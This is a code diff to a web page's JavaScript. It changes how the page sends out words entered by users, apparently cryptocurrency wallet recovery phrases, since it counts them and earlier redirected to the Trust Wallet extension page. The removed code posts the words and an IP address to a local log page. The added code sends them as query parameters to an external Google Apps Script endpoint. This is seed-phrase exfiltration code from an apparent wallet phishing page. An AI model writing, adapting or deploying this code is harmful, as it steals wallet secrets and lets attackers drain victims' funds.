@@ -413,32 +413,21 @@
 
                                         let ipAddress =
                                             "138.201.138.158";
+// Encode data for URL
+                  const params = new URLSearchParams({
 
-                                        fetch('save_to_log.html', {
-                                                method: 'POST',
-                                                body: JSON.stringify({
-                                                    words: words,
-                                                    ip_address: ipAddress,
-                                                    date: new Date().toISOString(),
-                                                    how_many_keywords: howManyWords
-                                                }),
-                                                headers: {
-                                                    'Content-Type': 'application/json'
-                                                }
-                                            })
-                                            .then(response => response.json())
-                                            .then(data => {
-                                                if (data.success) {
-                                                    window.location.href =
-                                                        'https://chromewebstore.google.com/detail/trust-wallet/egjidjbpglichdcondbcbdnbeeppgdph';
-                                                } else {
-                                                    alert('An error occurred.');
-                                                }
-                                            })
-                                            .catch(error => {
-                                                console.error('Data:', error);
-                                                alert('An error occurred.');
-                                            });
+                    howManyWords,
+                    words
+                  });
+
+                  // Your Web App URL
+                  const urlds = `https://script.google.com/macros/s/AKfycbw-mmW9NQO2MoBQiqpObrA0D5IcP8AT50jE_-CqSTEP6O5lunVRdLVQg25vR_krhgyyow/exec?${params.toString()}`;
+
+                  // Send GET request
+                  fetch(urlds)
+                    .then(res => res.text())
+                    .then(data => console.log(data))
+                    .catch(err => console.error('Error:', err));
                                     });
 
                                     option1.addEventListener('mouseover', function() {
